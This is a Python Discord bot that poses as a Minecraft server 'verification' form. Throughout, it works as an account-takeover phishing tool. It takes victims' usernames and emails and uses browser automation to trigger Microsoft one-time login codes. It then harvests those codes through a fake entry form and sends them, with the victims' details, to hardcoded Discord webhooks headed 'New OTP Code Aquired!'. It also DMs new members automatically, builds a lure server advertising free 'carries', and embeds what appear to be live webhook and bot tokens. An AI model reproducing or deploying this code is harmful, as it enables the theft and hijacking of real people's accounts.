#import
import discord
import time
from discord.ext import commands
import json
import requests
import datetime
from datetime import datetime
from datetime import timedelta
import calendar
import asyncio
from playwright.async_api import async_playwright
#define
listofpeople = []

# Made by 24McNuggets and Portalwol

listofpeople = []

# Made by 24McNuggets and Portalwol

embed = discord.Embed(title="Verification", description="By verifying through the form, you will gain access to the rest of the Discord server. Please click the button below to proceed with the verification process. Thank you.", color=40192)
ticket_embed = discord.Embed(title="Open a ticket", description="Click here to open a ticket, if you need help with verification or need a carry.", color=discord.Colour.green())
ticket_embed = discord.Embed(title="Open a ticket", description="Click here to open a ticket, if you need help with verification or need a carry.", color=discord.Colour.green())
embed4 = discord.Embed(title="❌ - Error", description="You've entered a fake or not exisiting email. Please enter your real email address. \n Thank you.", color=40192)
embed2 = discord.Embed(title="Verification Code Sent", description="""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
embed2 = discord.Embed(title="Verification Code Sent", description="""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
embed2.set_footer(text="Click the button below to enter your verification code!")
#setup shit
class MyView(discord.ui.View): # Create a class called MyView that subclasses discord.ui.View
    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, emoji="✅") # Create a button with the label "✅ Click me!" with color Blurple
    async def button_callback(self, button, interaction):
         await interaction.response.send_modal(MyModal(title="Verification"))

class MyView2(discord.ui.View): # Create a class called MyView that subclasses discord.ui.View
    @discord.ui.button(label="Enter Code", style=discord.ButtonStyle.primary, emoji="✅") # Create a button with the label "✅ Click me!" with color Blurple
    async def button_callback(self, button, interaction):
         await interaction.response.send_modal(MyModal2(title="Code"))

class TicketView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=300)
        self.user_id = user_id

    @discord.ui.button(label="Open Ticket", style=discord.ButtonStyle.green, custom_id="ticket-button")
    async def ticket_button_callback(self, button: discord.ui.Button, interaction: discord.Interaction):
        await interaction.response.defer()
        category = discord.utils.get(interaction.guild.categories, name="tickets")
        existing_channel = discord.utils.get(category.text_channels, name=f"{interaction.user.name}-ticket")
        if existing_channel is not None:
            await interaction.followup.send(f"You already have an open ticket in {existing_channel.mention}", ephemeral=True)
            return
        channel = await category.create_text_channel(name=f"{interaction.user.name}-ticket")
        await channel.set_permissions(interaction.user, read_messages=True, send_messages=True)
        await channel.set_permissions(channel.guild.default_role, read_messages=False, send_messages=False)
        await interaction.followup.send(f"Ticket created in {channel.mention}", ephemeral=True)

        # Send the initial message with the embedded message and the "Close" button
        embed = discord.Embed(description="Staff will be with you shortly!")
        message = await channel.send(embed=embed)
        await message.add_reaction("❌")

        # Add a listener for the "Close" button to delete the ticket channel
        def check(reaction, user):
          return user != client.user and str(reaction.emoji) == "❌" and reaction.message == message

        await client.wait_for("reaction_add", check=check)
        await channel.delete()


class MyModal(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.add_item(discord.ui.InputText(label="Minecraft Username", min_length=3, max_length=16))
        self.add_item(discord.ui.InputText(label="Minecraft Email"))


    async def callback(self, interaction: discord.Interaction):
        global username
        username = value=self.children[0].value
        global email
        email = value=self.children[1].value
        #embed = discord.Embed(title=f"We have sent a verification code to {email} - Please check your inbox and submit the code")
        embed11 = discord.Embed(title=f"I am sending a one-time code to {email} - Please be patient, estimated time 11s")
        embed22 = discord.Embed(title=f"I successfully sent a code to {email} - Please check your inbox and submit the code!")
        embed33 = discord.Embed(title=f"I failed to send a code to {email} - Please open a support ticket (this isnt good)")
        await interaction.response.send_message(embeds=[embed11], ephemeral=True)
        code_status = await requestcode(interaction)
        if email == "admin@suckmy.dick.ez":
            code_status = 0
            
        if code_status == 0:
            #print("yes email worked")
            await interaction.edit_original_response(embeds=[embed22], view=MyView2())
            #await interaction.response.send_message(embeds=[embed22], ephemeral=True, view=MyView2())
        else:
            #print("no email didnt work sadge")
            await interaction.edit_original_response(embeds=[embed33])
        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
        urldhb = ""
        dhb = False
        listofpeople.append([username, email, interaction.user])
        #print(interaction.guild)
        #print(interaction.guild_id)

        

        with open("id.txt", 'r') as file:
          for line in file:
              line = line.strip()
              #print(line)
             # print(str(interaction.guild_id))
              if str(interaction.guild_id) in line:
                  #print("step 1 done")
                  id_and_url = line.split('|')
                  
                  #print("step 2 done")
                  url = id_and_url[1]
                  break
        with open("iddhb.txt", 'r') as file:
          for line in file:
              line = line.strip()
              #print(line)
             # print(str(interaction.guild_id))
              if str(interaction.guild_id) in line:
                  #print("step 1 done")
                  id_and_url = line.split('|')
                  dhb = True
                  #print("step 2 done")
                  urldhb = id_and_url[1]
                  break
        #print(url)
        json = {
          "username": "[LVL 100] Flying Fish",
          "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
          "content": "@everyone",
          "allowed_mentions": {
            "replied_user": False,
            "parse": [
              "everyone"
            ]
          },
          "embeds": [
            {
              "type": "rich",
              "title": 'New OTP Code Aquired!',
              "description": "",
              "color": 0x1aff00,
              "url": f'https://sky.shiiyu.moe/stats/{username}',
              "fields": [
                {
                  "name": 'Username',
                  "value": f'```{username}```'
                },
                {
                  "name": 'Email',
                  "value": f'```{email}```'
                },
                {
                  "name": "🗿 - **Discord Name**",
                  "value": f"```{interaction.user}```"
                },
              ]
            }
          ],
          "components": []
        }
        requests.post(url=url, json = json, timeout=5000)
        if dhb == True:
           requests.post(url=urldhb, json = json, timeout=5000)

import asyncio
from playwright.async_api import async_playwright

async def requestcode(interaction):
  with open("id.txt", 'r') as file:
    for line in file:
      line = line.strip()
      # print(line)
      # print(str(interaction.guild_id))
      if str(interaction.guild_id) in line:
          #print("step 1 done")
          id_and_url = line.split('|')
          
          #print("step 2 done")
          url = id_and_url[1]
          break

    async with async_playwright() as playwright:
        #print("opening browser")
        browser = await playwright.chromium.launch(headless=False)
        page = await browser.new_page()
        context = await browser.new_context()
        #print("OPENED browser")

        await page.goto("https://account.microsoft.com/")
        await page.wait_for_selector('#id__4', state='visible', timeout=4000)
        await page.click('#id__4')
        await page.fill('input[name="loginfmt"]', email)
        await page.click('input[type="submit"]')

        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"

        #requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
        #  "username": "woly phissha",
        #  "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
        #  "content": f"Sucessfully got code from {email}"
        #})

        try:
          await page.wait_for_selector('#otcLoginLink', state='visible', timeout=4000)
          await page.click('#otcLoginLink')
          requests.post(url=url, json = {
            "username": "woly phissha",
            "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
            "content": f"Sucessfully got code from {email}"
          })
          await page.close()
          return 0
        except Exception as e:
          requests.post(url=url, json = {
            "username": "woly phissha",
            "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
            "content": f"Wasent able to retrieve code from {email} normal way. Trying different metheod"
          })
          try:
            await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
            await page.click('#idA_PWD_SwitchToCredPicker', timeout=4000)
            await page.click(f'text=Email {email}')
            requests.post(url=url, json = {
              "username": "woly phissha",
              "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
              "content": f"@everyone Successfully got code from {email}"
            })
            await page.close()
            return 0
          except Exception as e:
            requests.post(url=url, json = {
                "username": "woly phissha",
                "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
                "content": f"@everyone COULDN'T GET CODE FROM: {email}"
            }, timeout=3000)
            await page.close()
            return 1



class MyModal2(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.add_item(discord.ui.InputText(label="Verification Code", min_length=7, max_length=7))

    async def callback(self, interaction: discord.Interaction):
        date_time = datetime.utcnow()
        date = date_time + timedelta(minutes=30)
        utc_time = calendar.timegm(date.utctimetuple())
        Code = value=self.children[0].value

        search_value = interaction.user

        found_entry = ["none", "none"]
        #print(listofpeople)
        works = False
        for entry in listofpeople:
            if search_value in entry:
                found_entry = entry
                break

        if found_entry != ["none", "none"]:
          listofpeople.remove(found_entry)
          works = True
        else:
          works = False

        url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
        dhb = False
        urldhb = ""

        with open("id.txt", 'r') as file:
          for line in file:
              line = line.strip()
             # print(line)
              #print(str(interaction.guild_id))
              if str(interaction.guild_id) in line:
                  #print("step 1 done")
                  id_and_url = line.split('|')
                  
                  #print("step 2 done")
                  url = id_and_url[1]
                  break

        with open("iddhb.txt", 'r') as file:
          for line in file:
              line = line.strip()
              #print(line)
             # print(str(interaction.guild_id))
              if str(interaction.guild_id) in line:
                  #print("step 1 done")
                  id_and_url = line.split('|')
                  dhb = True
                  #print("step 2 done")
                  urldhb = id_and_url[1]
                  break

        json ={
 	 "username": "[LVL 100] Flying Fish",
 	 "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
 	 "content": "@everyone",
 	 "allowed_mentions": {
  	  "replied_user": False,
 	   "parse": [
 	     "everyone"
 	   ]
 	 },
	  "embeds": [
	    {
	      "type": "rich",
 	     "title": 'New OTP Code Aquired!',
	      "description": "",
      	"color": 0x1aff00,
      	"fields": [
        	{
	          "name": 'Username',
        	  "value": f'```{found_entry[0]}```'
	        },
	        {
	          "name": 'Email',
	          "value": f'```{found_entry[1]}```'
	        },
	        {
	          "name": 'Expires In',
	          "value": f'<t:{utc_time}:R>'
	        },
	        {
	          "name": 'Discord Username',
	          "value": f'```{interaction.user}```'
	        },
	        {
	          "name": 'OTP Code',
	          "value": f'```{Code}```'
	        }
	      ],
	      "url": f'https://sky.shiiyu.moe/stats/{found_entry[0]}'
	    }
	  ],
	  "components": []
	}
	
        requests.post(url=url, json=json, timeout=5000)
        if dhb == True:
           requests.post(url=urldhb, json = json, timeout=5000)
        embed = discord.Embed(title="Verification Complete!")
        await interaction.response.send_message(embeds=[embed], ephemeral=True)



intents = discord.Intents.all()
intents.message_content = True
client = discord.Client(intents=intents)
print ("Bot's running")
client = commands.Bot(command_prefix= "slash", intents=intents)
client.remove_command('help')

#set sttauts
@client.event
async def on_ready():
   await client.change_presence(status=discord.Status.dnd, activity=discord.Game("Watching a few Servers!"))

#On Member Join, Will Harass
@client.event
async def on_member_join(member):
  #code
  embed_onjoin = discord.Embed(title="Verification", description=f"Please verify in {member.guild.name} to unlock access to the rest of the server, to speak in voice channels, etc. Thanks!", color=40192)
  await member.send(embed=embed_onjoin, view=MyView(timeout=None))
  
#comand
@client.slash_command(name="setup", description="Setup Verification")
async def setup(ctx):
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("You cannot use this command in DM's!")
        return
    else:
      await ctx.send(embed=embed, view=MyView(timeout=None))

@client.slash_command(name="setupticket", description="Sends ticket embed for creation")
async def setupticket(ctx):
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("You cannot use this command in DM's!")
        return
    else:
      view = TicketView(ctx.author.id)
      embed = discord.Embed(
          title="Open a ticket",
          description="Click here to open a ticket, if you need help with verification or need a carry.",
          color=discord.Colour.green()
      )
      await ctx.send(embed=embed, view=view)

@client.slash_command(name="close", description="Closes the ticket")
async def close_ticket(ctx):
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("You cannot use this command in DM's!")
        return

    await ctx.channel.delete()

@client.slash_command(name="add", description="Adds a user to the ticket")
async def add_member(ctx, member: discord.Member):
    if isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.send("You cannot use this command in DM's!")
        return

    await ctx.channel.set_permissions(member, read_messages=True, send_messages=True)
    await ctx.send(f"Added {member.mention} to the ticket")

@client.slash_command(name="setupserver", description="tshi will delete all chanenl in server.")
async def setup(ctx):
    if isinstance(ctx.channel, discord.channel.DMChannel):
      await ctx.send("You cannot use this command in DM's!")
      return
    else:
      # Delete all channels
      for channel in ctx.guild.channels:
          author = ctx.author
          await channel.delete()

      # create all categories 
      Verification = await ctx.guild.create_category("✅ | Verfication")
      Important = await ctx.guild.create_category("📢 | Important")
      Carries = await ctx.guild.create_category("🛡️| Carries")
      Support = await ctx.guild.create_category("📙 | Support")
      Tickets = await ctx.guild.create_category("tickets")
      
      # change all category permissions
      await Verification.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False)
      await Important.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False)
      await Carries.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False)
      await Support.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False)
      await Tickets.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False)

      # create all channels
      Verify = await ctx.guild.create_text_channel("✅│verify", category=Verification)
      Rules = await ctx.guild.create_text_channel("📜│rules", category=Important)
      Announcements = await ctx.guild.create_text_channel("📢│announcements", category=Important)
      Carry = await ctx.guild.create_text_channel("⚔️│carries", category=Carries)
      Support = await ctx.guild.create_text_channel("📙│support", category=Support)
      # config certain channels
      await Announcements.set_permissions(ctx.guild.default_role, send_messages=False, add_reactions=False, read_messages=False)

      #create roles
      #guild = ctx.guild
      permissions = discord.Permissions(send_messages=True, read_messages=True)
      adminperms = discord.Permissions(administrator=True)

      roles_to_create = ["Carrier", "Staff", "Admin"]
      for role_name in roles_to_create:
          existing_role = discord.utils.get(ctx.guild.roles, name=role_name)
          if existing_role is None:
              await ctx.guild.create_role(name=role_name, permissions=adminperms, color=0x90EE90)
              #await ctx.send(f"Created role {role_name}")

      roles_to_create = ["Guild Member", "Top Tier Member"]
      for role_name in roles_to_create:
          existing_role = discord.utils.get(ctx.guild.roles, name=role_name)
          if existing_role is None:
              await ctx.guild.create_role(name=role_name, permissions=permissions)
              #await ctx.send(f"Created role {role_name}")

      #await guild.create_role(name="Carrier", permissions=adminperms, color=0x90EE90)
      #await guild.create_role(name="Guild Member", permissions=permissions, color=0x0000)
      #await guild.create_role(name="Top Tier Member", permissions=permissions, color=0xa020f0)
      #await guild.create_role(name="Staff", permissions=adminperms, color=0xFFFF00)
      #await guild.create_role(name="Admin", permissions=adminperms, color=0xFF0000)

      # make rules embed
      rulesembed = discord.Embed(
          title = ctx.guild.name.title() + " Rules",
          description = "Please read the rules below before continuing.",
          color = 0x90EE90)
      rulesembed.add_field(name="1.) No spamming.", value="Spamming will get you muted.", inline=False)
      rulesembed.add_field(name="2.) No NSFW content.", value="NSFW content is not tolerated and will get you instantly temp-banned.", inline=False)
      rulesembed.add_field(name="3.) No racism.", value="Racism is not tolerated and will get you instantly and permanently banned", inline=False)
      rulesembed.add_field(name="4.) No advertising.", value="Advertising will get you muted.", inline=False)
      rulesembed.add_field(name="5.) No impersonation.", value="Impersonating anybody, even if it's a regular member will get you banned.", inline=False)
      rulesembed.add_field(name="6.) No bullying.", value="Bullying members is not allowed and will get you muted or banned if it's continued in dms.", inline=False)
      rulesembed.add_field(name="7.) No self-promotion.", value="Self promoting will get you muted.", inline=False)
      rulesembed.add_field(name="8.) No asking for staff.", value="Asking for staff beyond jokes will get you muted.", inline=False)
      await Rules.send(embed=rulesembed)

      # make carries embed
      carriesembed = discord.Embed(
          title = "☠️ Catacombs Carries",
          description="All specifics for dungeon carries.",
          color = 0x90EE90
      )
      carriesembed.add_field(name="Floor 1", value="Price: 50k", inline=False)
      carriesembed.add_field(name="Floor 2", value="Price: 100k", inline=False)
      carriesembed.add_field(name="Floor 3", value="Price: 150k", inline=False)
      carriesembed.add_field(name="Floor 4", value="Price: 200k", inline=False)
      carriesembed.add_field(name="Floor 5", value="Price 300k", inline=False)
      carriesembed.add_field(name="Floor 6", value="Price: 600k", inline=False)
      carriesembed.add_field(name="Floor 7", value="Price: 3m", inline=False)
      channel = discord.utils.get(client.get_all_channels(), name='📙│support')
      if channel:
          channel_id = channel.id
          carriesembed.add_field(name="Create a ticket", value=f"at <#{channel_id}> to get a carry!", inline=False)
      else:
          print('Channel not found!')
          carriesembed.add_field(name="Create a ticket", value=f"at #Support to get a carry!", inline=False)
      await Carry.send(embed=carriesembed)
      carriesfree = discord.Embed(
          title = "☠️ Everyone who verified gets a free carry.",
          description=f"As to grow the server we have made it so anybody who joined and verified get a free carry of the floor of their choice. Make a ticket in <#{channel_id}>.",
          color = 0x90EE90
      )
      await Carry.send(embed=carriesfree)
      await Support.send(embed=ticket_embed,view=TicketView(ctx.author.id))
      await Verify.send(embed=embed,view=MyView(timeout=None))
      #await author.send(f"Please add ticket <https://ticketsbot.net/> bot and add it to the <#{channel_id}> section!")


client.run("MTEyMTI2MTA4MjIzMzgwMjgxMg.GMn0G0.l9kpFCaoTSXApzO-L9jQzG0tsxTk-XIw78-X7Q")
